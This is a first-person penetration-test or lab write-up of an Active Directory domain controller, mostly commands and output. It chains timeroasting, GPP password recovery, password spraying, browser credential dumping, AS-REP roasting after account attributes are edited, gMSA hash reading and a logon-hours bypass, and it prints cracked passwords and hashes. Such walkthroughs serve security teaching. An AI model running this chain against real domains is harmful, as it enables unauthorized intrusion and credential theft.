
# Objective and scope
You have been hired to perform an internal penetration test against the client's Active Directory environment. There is only one host in-scope (the Domain Controller). Your task is to get initial access and then perform lateral movement and privilege escalation until you have fully compromised the domain.

The client has provided you with VPN access to their environment, but no other information

# Host file setup
```python
sudo nxc smb 10.0.29.162 --generate-hosts-file /etc/hosts 
[sudo] password for kali: 
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=1000 -sT dc01.fragments.local                                                            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 16:42 +0100
Nmap scan report for dc01.fragments.local (10.0.29.162)
Host is up (0.097s latency).
rDNS record for 10.0.29.162: DC01.fragments.local
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3389/tcp  open  ms-wbt-server
49684/tcp open  unknown
49688/tcp open  unknown
49719/tcp open  unknown
49753/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 131.83 seconds
```

Port 88, 389 and 5985 are also open
## Nmap
```python
nmap -p 53,88,111,135,139,389,445,464,593,636,2049,3389,5985 -A --min-rate=1000 -sT dc01.fragments.local  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 16:46 +0100
Nmap scan report for dc01.fragments.local (10.0.29.162)
Host is up (0.098s latency).
rDNS record for 10.0.29.162: DC01.fragments.local

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-03 15:46:42Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fragments.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=DC01.fragments.local
| Not valid before: 2026-07-13T01:02:46
|_Not valid after:  2027-01-12T01:02:46
| rdp-ntlm-info: 
|   Target_Name: FRAGMENTS
|   NetBIOS_Domain_Name: FRAGMENTS
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: fragments.local
|   DNS_Computer_Name: DC01.fragments.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-03T15:47:36+00:00
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/3%Time=6A70B7E7%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth enabled, cant use it to access shares or list users

Guest account is also disabled

# NFS (2049)
## Shares
```python
nxc nfs dc01.fragments.local --shares
NFS         10.0.29.162     2049   dc01.fragments.local [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.0.29.162     2049   dc01.fragments.local [*] Enumerating NFS Shares
NFS         10.0.29.162     2049   dc01.fragments.local UID        Perms    Storage Usage    Share                          Access List    
NFS         10.0.29.162     2049   dc01.fragments.local ---        -----    -------------    -----                          -----------    
NFS         10.0.29.162     2049   dc01.fragments.local 4294967294 r--      36.3GB/49.9GB    /incidents                     Everyone 
```

There is no root escape!

```python
nxc nfs dc01.fragments.local --share '/incidents' --ls '/'
NFS         10.0.29.162     2049   dc01.fragments.local [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.0.29.162     2049   dc01.fragments.local UID        Perms  File Size     File Path
NFS         10.0.29.162     2049   dc01.fragments.local ---        -----  ---------     ---------
NFS         10.0.29.162     2049   dc01.fragments.local 4294967294 dr--   64.0B         /incidents/.
NFS         10.0.29.162     2049   dc01.fragments.local 4294967294 dr--   64.0B         /incidents/..
NFS         10.0.29.162     2049   dc01.fragments.local 4294967294 -r-x   647.0B        /incidents/IR_20260122_ACC.log
NFS         10.0.29.162     2049   dc01.fragments.local 4294967294 -r-x   1.3KB         /incidents/IR_20260202_FRG0310.log
```

## Downloading files from share
```python
nxc nfs dc01.fragments.local --share '/incidents' --get-file IR_20260122_ACC.log IR_20260122_ACC.log
NFS         10.0.29.162     2049   dc01.fragments.local [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.0.29.162     2049   dc01.fragments.local [*] Downloading IR_20260122_ACC.log to IR_20260122_ACC.log
NFS         10.0.29.162     2049   dc01.fragments.local File successfully downloaded from IR_20260122_ACC.log to IR_20260122_ACC.log

nxc nfs dc01.fragments.local --share '/incidents' --get-file IR_20260202_FRG0310.log IR_20260202_FRG0310.log
NFS         10.0.29.162     2049   dc01.fragments.local [*] Supported NFS versions: (2, 3, 4) (root escape:False)
NFS         10.0.29.162     2049   dc01.fragments.local [*] Downloading IR_20260202_FRG0310.log to IR_20260202_FRG0310.log
NFS         10.0.29.162     2049   dc01.fragments.local File successfully downloaded from IR_20260202_FRG0310.log to IR_20260202_FRG0310.log
```

```python
cat IR_20260122_ACC.log 
==================================================
INCIDENT RESPONSE LOG - INTERNAL USE ONLY
==================================================
File: IR_20260122_ACC.log
Created: 2026-01-22 10:15:21 EST
Last Modified: 2026-01-22 10:15:21 EST
Case ID: IR-2026-0122
User: Administrator
Status: Under Investigation
Severity: MEDIUM (5.1/10)
==================================================

== INCIDENT SUMMARY ==
While updating a user account, I may have messed up one of the account attributes and now the account doesn't work.

== TIMELINE ==
2026-01-22: Under Investigation...
==================================================
```

```python
cat IR_20260202_FRG0310.log 
==================================================
INCIDENT RESPONSE LOG - INTERNAL USE ONLY
==================================================
File: IR_20260202_FRG0310.log
Created: 2026-02-02 09:14:22 EST
Last Modified: 2026-02-02 11:30:47 EST
Case ID: IR-2026-0022
System: FRG0310.fragments.local
User: Administrator
Agent: Built-in Windows Defender
Status: Under Investigation
Severity: MEDIUM (5.8/10)
Threat ID: DEFENDER-ALERT-7721
==================================================

== INCIDENT SUMMARY ==
Security alert triggered on workstation FRG0310 (Windows 11 Pro).
Detection: Unusual PowerShell script execution patterns.
Activity: Multiple failed authentication attempts from user session.
Impact: Local credential caching anomalies detected.
No external network communications observed.

== TIMELINE ==
2026-02-02 08:45:10 - Initial alert: PowerShell execution anomaly
2026-02-02 09:00:33 - Failed logon attempts from existing session
2026-02-02 09:14:22 - Investigation initiated
2026-02-02 10:15:00 - System isolated for analysis

== RECOMMENDED ACTIONS ==
1. Review authentication logs
2. Check for local privilege escalation
3. Reset local Administrator account
4. Scan for persistence mechanisms
==================================================
```

I also cannot upload to the share!

Looks like there is a machine account `FRG0310$`

# TimeRoasting

```python
nxc smb dc01.fragments.local -u '' -p '' -M timeroast --smb-timeout 5 
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\: 
TIMEROAST   10.0.29.162     445    DC01             [*] Starting Timeroasting...
TIMEROAST   10.0.29.162     445    DC01             1000:$sntp-ms$e68346c899760c793adf42f2951095c9$1c0111e900000000000a08434c4f434cee1b34d96467d92de1b8428bffbfcd0aee1b3fbea09095e4ee1b3fbea090f22b
TIMEROAST   10.0.29.162     445    DC01             1105:$sntp-ms$78276a9558e9c4bb2159c199767b7416$1c0111e900000000000a08444c4f434cee1b34d96367df0ce1b8428bffbfcd0aee1b3fbf4367a601ee1b3fbf436808fd
TIMEROAST   10.0.29.162     445    DC01             1103:$sntp-ms$53f13f15a697cb399576d35a20bd875a$1c0111e900000000000a08444c4f434cee1b34d9645c5062e1b8428bffbfcd0aee1b3fbf4085172bee1b3fbf40856cbb
```

Ill place these hashes into a text file!

```python
hashcat -m 31300 timeroast.hash /usr/share/wordlists/rockyou.txt

$sntp-ms$53f13f15a697cb399576d35a20bd875a$1c0111e900000000000a08444c4f434cee1b34d9645c5062e1b8428bffbfcd0aee1b3fbf4085172bee1b3fbf40856cbb:supercalifradualisticexpialidoutious
```

Found a password

```python
supercalifradualisticexpialidoutious
```

Since i dont have a user list ill have to just try this against the machine account i found

# Enumeration using `FRG0310$`

```python
nxc smb dc01.fragments.local -u 'FRG0310$' -p 'supercalifradualisticexpialidoutious' --smb-timeout 5
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\FRG0310$:supercalifradualisticexpialidoutious
```

This machine account is now compromised!

## SMB Shares
```python
nxc smb dc01.fragments.local -u 'FRG0310$' -p 'supercalifradualisticexpialidoutious' --shares --smb-timeout 5
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\FRG0310$:supercalifradualisticexpialidoutious 
SMB         10.0.29.162     445    DC01             [*] Enumerated shares
SMB         10.0.29.162     445    DC01             Share           Permissions     Remark
SMB         10.0.29.162     445    DC01             -----           -----------     ------
SMB         10.0.29.162     445    DC01             ADMIN$                          Remote Admin
SMB         10.0.29.162     445    DC01             C$                              Default share
SMB         10.0.29.162     445    DC01             IPC$            READ            Remote IPC
SMB         10.0.29.162     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.29.162     445    DC01             SYSVOL          READ            Logon server share
```

Just the default SMB shares!

## Dumping users 
```python
nxc smb dc01.fragments.local -u 'FRG0310$' -p 'supercalifradualisticexpialidoutious' --rid-brute 20000 --smb-timeout 5 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
FRG0310$
PROD$
o.rodrigo
j.woods
d.goggins
c.white
sharedadmin
```

Ill dump them all to a user file!

No kerberoastable accounts

# GPP password
```python
nxc smb dc01.fragments.local -u 'FRG0310$' -p 'supercalifradualisticexpialidoutious' --smb-timeout 5 -M gpp_password
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\FRG0310$:supercalifradualisticexpialidoutious 
SMB         10.0.29.162     445    DC01             [*] Enumerated shares
SMB         10.0.29.162     445    DC01             Share           Permissions     Remark
SMB         10.0.29.162     445    DC01             -----           -----------     ------
SMB         10.0.29.162     445    DC01             ADMIN$                          Remote Admin
SMB         10.0.29.162     445    DC01             C$                              Default share
SMB         10.0.29.162     445    DC01             IPC$            READ            Remote IPC
SMB         10.0.29.162     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.29.162     445    DC01             SYSVOL          READ            Logon server share 
GPP_PASS... 10.0.29.162     445    DC01             [+] Found SYSVOL share
GPP_PASS... 10.0.29.162     445    DC01             [*] Searching for potential XML files containing passwords
GPP_PASS... 10.0.29.162     445    DC01             [*] Found fragments.local/Policies/{EDFFE4E4-762D-47E5-85E7-B52950A90149}/Machine/Preferences/Groups/Groups.xml
```

So after trying loads of different things even doing this exact thing but using the impacket script, i find for some reason it doesnt work with the impacket script

```python
cat Groups.xml     
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="FRG-Admin" image="2" changed="2026-02-03 01:17:44" uid="{7CC08D65-4703-4986-A026-C3FB321947CA}"><Properties action="U" newName="" description="ESwXHXweG!" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="" groupName="FRG-Admin"/></Group>
</Groups>
```

Ill download it using smbclient then grab the password from inside!

```python
ESwXHXweG!
```

So its not given me a user so ill spray it against the userlist

# Password spray leads to user compromise

```python
nxc smb dc01.fragments.local -u users.txt -p 'ESwXHXweG!' --continue-on-success --smb-timeout 5  
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [-] fragments.local\Administrator:ESwXHXweG! STATUS_LOGON_FAILURE 
SMB         10.0.29.162     445    DC01             [-] fragments.local\Guest:ESwXHXweG! STATUS_LOGON_FAILURE 
SMB         10.0.29.162     445    DC01             [-] fragments.local\krbtgt:ESwXHXweG! STATUS_LOGON_FAILURE 
SMB         10.0.29.162     445    DC01             [-] fragments.local\DC01$:ESwXHXweG! STATUS_LOGON_FAILURE 
SMB         10.0.29.162     445    DC01             [-] fragments.local\FRG0310$:ESwXHXweG! STATUS_LOGON_FAILURE 
SMB         10.0.29.162     445    DC01             [-] fragments.local\PROD$:ESwXHXweG! STATUS_LOGON_FAILURE 
SMB         10.0.29.162     445    DC01             [-] fragments.local\o.rodrigo:ESwXHXweG! STATUS_LOGON_FAILURE 
SMB         10.0.29.162     445    DC01             [-] fragments.local\j.woods:ESwXHXweG! STATUS_LOGON_FAILURE 
SMB         10.0.29.162     445    DC01             [-] fragments.local\d.goggins:ESwXHXweG! STATUS_LOGON_FAILURE 
SMB         10.0.29.162     445    DC01             [+] fragments.local\c.white:ESwXHXweG! 
SMB         10.0.29.162     445    DC01             [-] fragments.local\sharedadmin:ESwXHXweG! STATUS_ACCOUNT_RESTRICTION
```

So ive now compromised a user `c.white`

There is also a `STATUS_ACCOUNT_RESTRICTION` on the `shareadmin` and after checking bloodhound data i see the user is in protected users

The user has the same privileges on SMB as the compromised machine account

# Enumeration on `c.white`

![](Pasted%20image%2020260803180050.png)

This user is a part of remote management users

```python
*Evil-WinRM* PS C:\Users\c.white\AppData\Roaming> dir


    Directory: C:\Users\c.white\AppData\Roaming


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-          4/1/2024   1:12 AM                Microsoft
d-----          2/2/2026   3:35 PM                Opera GX Stable


*Evil-WinRM* PS C:\Users\c.white\AppData\Roaming>
```

Opera GX is installed?

# Dumping credentials from Opera GX

https://github.com/moond4rk/HackBrowserData

Ill download the release from the github and upload the exe to the target 

```python
*Evil-WinRM* PS C:\Users\c.white\Documents> .\hack-browser-data.exe -d . -b opera-gx -p "C:\Users\c.white\AppData\Roaming\Opera GX Stable"
hack-browser-data.exe : [INF] Extracting OperaGX...
    + CategoryInfo          : NotSpecified: ([INF] Extracting OperaGX...:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[WRN] OperaGX: master key retrieval: v10: DPAPI decrypt: CryptUnprotectData: Key not valid for use in specified state.[INF] Exported to ./[INF]   bookmark.json            2 entries[INF]   extension.json
```

This ran the tool and saved some results to the current directory

```python
*Evil-WinRM* PS C:\Users\c.white\Documents> type bookmark.json
[
  {
    "browser": "OperaGX",
    "profile": "Default",
    "id": 23,
    "name": "My Vault",
    "type": "url",
    "url": "https://passwordmgmt.framgents.local/?vaultData=ew0KICAiY29tcGFueSI6ICJGcmFnbWVudHMgSW5jLiIsDQogICJkb21haW4iOiAiZnJhZ21lbnRzLmxvY2FsIiwNCiAgImRlc2NyaXB0aW9uIjogIkludGVybmFsIGNvcnBvcmF0ZSBwYXNzd29yZCB2YXVsdCAtIENPTkZJREVOVElBTCIsDQogICJsYXN0X3VwZGF0ZWQiOiAiMjAyNC0wMS0xNVQwOTozMDowMFoiLA0KICAidmVyc2lvbiI6ICIzLjIiLA0KICAicGFzc3dvcmRzIjogWw0KICAgIHsNCiAgICAgICJpZCI6ICJGUkctRU1QLTA0MjEiLA0KICAgICAgInVzZXJuYW1lIjogImoud29vZHMiLA0KICAgICAgImRpc3BsYXlfbmFtZSI6ICJKb3JkYW4gV29vZHMiLA0KICAgICAgInRpdGxlIjogIlNlbmlvciBOZXR3b3JrIEFyY2hpdGVjdCIsDQogICAgICAiZGVwYXJ0bWVudCI6ICJJVCBJbmZyYXN0cnVjdHVyZSIsDQogICAgICAiZW1haWwiOiAiai53b29kc0BmcmFnbWVudHMtaW5jLmNvbSIsDQogICAgICAicGFzc3dvcmQiOiAiaHBGcVVMdFFvWSEiLA0KICAgICAgInBhc3N3b3JkX3N0cmVuZ3RoIjogOTIsDQogICAgICAibGFzdF9jaGFuZ2VkIjogIjIwMjQtMDEtMTBUMTQ6MjI6MDBaIiwNCiAgICAgICJleHBpcmVzIjogIjIwMjQtMDQtMTBUMDA6MDA6MDBaIiwNCiAgICAgICJtZmFfZW5hYmxlZCI6IGZhbHNlLA0KICAgICAgIm1mYV90eXBlIjogIlRPVFAiLA0KICAgICAgIm5vdGVzIjogIlBhc3N3b3JkIGNvbXBsaWVzIHdpdGggcG9saWN5IHY0LjIuIiwNCiAgICB9LA0KICAgIHsNCiAgICAgICJpZCI6ICJGUkctRU1QLTE4NzciLA0KICAgICAgInVzZXJuYW1lIjogImQuZ29nZ2lucyIsDQogICAgICAiZGlzcGxheV9uYW1lIjogIkRhdmlkIERHLiBHb2dnaW5zIiwNCiAgICAgICJ0aXRsZSI6ICJTZWN1cml0eSBPcGVyYXRpb25zIExlYWQiLA0KICAgICAgImRlcGFydG1lbnQiOiAiQ3liZXJzZWN1cml0eSIsDQogICAgICAiZW1haWwiOiAiZC5nb2dnaW5zQGZyYWdtZW50cy1pbmMuY29tIiwNCiAgICAgICJwYXNzd29yZCI6ICJIaU81bjQ0OVczNiEiLA0KICAgICAgInBhc3N3b3JkX3N0cmVuZ3RoIjogOTYsDQogICAgICAiY2F0ZWdvcnkiOiAiU2VjdXJpdHkgQWNjb3VudCIsDQogICAgICAibGFzdF9jaGFuZ2VkIjogIjIwMjQtMDEtMTRUMDg6MTU6MDBaIiwNCiAgICAgICJleHBpcmVzIjogIjIwMjQtMDQtMTRUMDA6MDA6MDBaIiwNCiAgICAgICJtZmFfZW5hYmxlZCI6IGZhbHNlLA0KICAgICAgIm1mYV90eXBlIjogIkZJRE8yIEhhcmR3YXJlIEtleSIsDQogICAgICAibm90ZXMiOiAiUGFzc3dvcmQgY29tcGxpZXMgd2l0aCBwb2xpY3kgdjQuMi4iLA0KICAgIH0NCiAgXSwNCiAgInBvbGljeV9yZWZlcmVuY2VzIjogew0KICAgICJwYXNzd29yZF9wb2xpY3kiOiAiRlJHLUlULVBPTC0wMDcgdjQuMiIsDQogICAgIm1pbmltdW1fbGVuZ3RoIjogMTIsDQogICAgImNvbXBsZXhpdHlfcmVxdWlyZWQiOiB0cnVlLA0KICAgICJleHBpcmF0aW9uX2RheXMiOiA5MCwNCiAgICAiaGlzdG9yeV9jb3VudCI6IDEwLA0KICAgICJsb2Nrb3V0X3RocmVzaG9sZCI6IDUsDQogICAgImxvY2tvdXRfZHVyYXRpb24iOiAzMA0KICB9LA0KICAidmF1bHRfbWV0YWRhdGEiOiB7DQogICAgImVuY3J5cHRpb24iOiAiQUVTLTI1Ni1HQ00iLA0KICAgICJmb3JtYXRfdmVyc2lvbiI6ICIyLjEiLA0KICAgICJleHBvcnRlZF9ieSI6ICJzdmMtcGFzc3dvcmRtYW5hZ2VyIiwNCiAgICAiZXhwb3J0X3JlYXNvbiI6ICJRdWFydGVybHkgYXVkaXQiLA0KICAgICJjaGVja3N1bSI6ICJhMWIyYzNkNGU1ZjY3ODkwMTIzNDU2Nzg5YWJjZGVmMCINCiAgfQ0KfQ==",
    "folder": "Passwords",
    "created_at": "2026-02-06T05:06:32.278598Z"
  },
  {
    "browser": "OperaGX",
    "profile": "Default",
    "id": 23,
    "name": "Amazing Blog",
    "type": "url",
    "url": "https://zer0xjr.com/",
    "folder": "Passwords",
    "created_at": "2026-02-06T05:06:32.278598Z"
  }
]
*Evil-WinRM* PS C:\Users\c.white\Documents>
```

Ill use the terminal to decode the base64 output

```python
"id": "FRG-EMP-0421",
"username": "j.woods",
"display_name": "Jordan Woods",
"title": "Senior Network Architect",
"department": "IT Infrastructure",
"email": "j.woods@fragments-inc.com",
"password": "hpFqULtQoY!",
"password_strength": 92,
"last_changed": "2024-01-10T14:22:00Z",
"expires": "2024-04-10T00:00:00Z",
"mfa_enabled": false,
"mfa_type": "TOTP",
"notes": "Password complies with policy v4.2.",

"id": "FRG-EMP-1877",
"username": "d.goggins",
"display_name": "David DG. Goggins",
"title": "Security Operations Lead",
"department": "Cybersecurity",
"email": "d.goggins@fragments-inc.com",
"password": "HiO5n449W36!",
"password_strength": 96,
"category": "Security Account",
"last_changed": "2024-01-14T08:15:00Z",
"expires": "2024-04-14T00:00:00Z",
"mfa_enabled": false,
"mfa_type": "FIDO2 Hardware Key",
"notes": "Password complies with policy v4.2.",
```

Found two passwords for two different users!

```python
j.woods:hpFqULtQoY!
d.goggins:HiO5n449W36!
```

Ill validate these credentials

# Compromising `j.woods` and `d.goggins`

```python
nxc smb dc01.fragments.local -u j.woods -p 'hpFqULtQoY!' --smb-timeout 2                     
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\j.woods:hpFqULtQoY!
```

```python
nxc smb dc01.fragments.local -u d.goggins -p 'HiO5n449W36!' --smb-timeout 5
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [-] fragments.local\d.goggins:HiO5n449W36! STATUS_INVALID_LOGON_HOURS
```

So i have access as `j.woods` and also for `d.goggins` but theyve got restricted logon hours but the creds are valid!

# Compromising `o.rodrigo`

So since i cant really use `d.gogins` yet, i can check what access `j.woods` has got

```python
bloodyAD --host dc01.fragments.local -d fragments.local -u 'j.woods' -p 'hpFqULtQoY!' get writable --detail

distinguishedName: CN=Olivia OR. Rodrigo,CN=Users,DC=fragments,DC=local
userAccountControl: WRITE

...[SNIP]...
```

This user has write access on this user, this means i should be able to make this user AS-REP roastable

```python
bloodyAD --host dc01.fragments.local -d fragments.local -u j.woods -p 'hpFqULtQoY!' add uac 'o.rodrigo' -f DONT_REQ_PREAUTH 
[+] ['DONT_REQ_PREAUTH'] property flags added to o.rodrigo's userAccountControl
```

First ill make the account AS-REP roastable

But now checking bloodhound the account looks disabled

```python
bloodyAD --host dc01.fragments.local -d fragments.local -u j.woods -p 'hpFqULtQoY!' remove uac 'o.rodrigo' -f ACCOUNTDISABLE

[+] ['ACCOUNTDISABLE'] property flags removed from o.rodrigo's userAccountControl
```

Now the account is enabled and AS-REP roastable i can dump the hash

```python
impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip '10.0.29.162' 'fragments.local/'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FRG0310$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User PROD$ doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$o.rodrigo@FRAGMENTS.LOCAL:dedd90af65196a4b0cb853d2f8006588$a53ee4a6919462a6355c2e14b04f3679de49e30798fed5f4948a98f0635abb1bedb2f75a718b7dec7e52c1485076361d955e34f762f23c0de39bd3ef0a02eeb9f4db8f4ce94d49970dc6a8b8ccc6b97706396d8ab2f4fa8982cc0867f8dd305a7f8f9a9fa6cb62ad6098091b6961b814a80234bfa2cf0ef4105a67db0aaaadb6d7825b283ce78955ad776d0af58def226e058e1c74e089356b0a35ff21d9c4a0775585f19cea038c858d6bfb7b871fcd173a3f1221aef1bb364d089ab7f2fec9622499ff2459d8f7058a39011cbdfd252f52ab3420578c1b246eb1fe8a0269c89a480a3a2a083d57b8d8ecaa0c9011054f57
[-] User j.woods doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User d.goggins doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User c.white doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sharedadmin doesn't have UF_DONT_REQUIRE_PREAUTH set
```

I now have the hash, so ill try to crack it!

```python
hashcat ASREProastables.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$o.rodrigo@FRAGMENTS.LOCAL:dedd90af65196a4b0cb853d2f8006588$a53ee4a6919462a6355c2e14b04f3679de49e30798fed5f4948a98f0635abb1bedb2f75a718b7dec7e52c1485076361d955e34f762f23c0de39bd3ef0a02eeb9f4db8f4ce94d49970dc6a8b8ccc6b97706396d8ab2f4fa8982cc0867f8dd305a7f8f9a9fa6cb62ad6098091b6961b814a80234bfa2cf0ef4105a67db0aaaadb6d7825b283ce78955ad776d0af58def226e058e1c74e089356b0a35ff21d9c4a0775585f19cea038c858d6bfb7b871fcd173a3f1221aef1bb364d089ab7f2fec9622499ff2459d8f7058a39011cbdfd252f52ab3420578c1b246eb1fe8a0269c89a480a3a2a083d57b8d8ecaa0c9011054f57:nohacking!
```

```python
nxc smb dc01.fragments.local -u o.rodrigo -p 'nohacking!' --smb-timeout 5
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\o.rodrigo:nohacking!
```

The hash cracked, now this user is compromised!

# Enumeration as `o.rodrigo`

![](Pasted%20image%2020260803193918.png)

I have ReadGMSAPassword on the `PROD$` account

# Compromising `prod$`

```python
nxc ldap dc01.fragments.local -u o.rodrigo -p 'nohacking!' --gmsa                
LDAP        10.0.29.162     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:fragments.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.29.162     389    DC01             [+] fragments.local\o.rodrigo:nohacking! 
LDAP        10.0.29.162     389    DC01             [*] Getting GMSA Passwords
LDAP        10.0.29.162     389    DC01             Account: PROD$                NTLM: b43cb2fcadff72ff9136a2f42218c430     PrincipalsAllowedToReadPassword: Management
```

I now have the NTLM hash of the `prod$` account

```python
nxc smb dc01.fragments.local -u 'prod$' -H 'b43cb2fcadff72ff9136a2f42218c430' --smb-timeout 5
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\prod$:b43cb2fcadff72ff9136a2f42218c430
```

# Enumeration as `prod$`

```python
bloodyAD --host dc01.fragments.local -d fragments.local -u 'prod$' -p ':b43cb2fcadff72ff9136a2f42218c430' get writable --detail

distinguishedName: CN=David DG. Goggins,CN=Users,DC=fragments,DC=local
logonHours: WRITE
```

This is where i can modify the logon hours of this account and get access!

# Compromising `d.goggins`

```python
bloodyAD --host dc01.fragments.local -d fragments.local -u 'prod$' -p ':b43cb2fcadff72ff9136a2f42218c430' set object 'd.goggins' logonhours -v '////////////////////////////' --b64
[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
[+] d.goggins's logonHours has been updated
```

Now his logon hours should be modified!

```python
nxc smb dc01.fragments.local -u d.goggins -p 'HiO5n449W36!' --smb-timeout 5
SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.29.162     445    DC01             [+] fragments.local\d.goggins:HiO5n449W36!
```

Now this user is compromised!

# Enumeration as `d.goggins`

![](Pasted%20image%2020260803194911.png)

Looks like i have AddSelf on a group called `adminaccs`

![](Pasted%20image%2020260803195011.png)

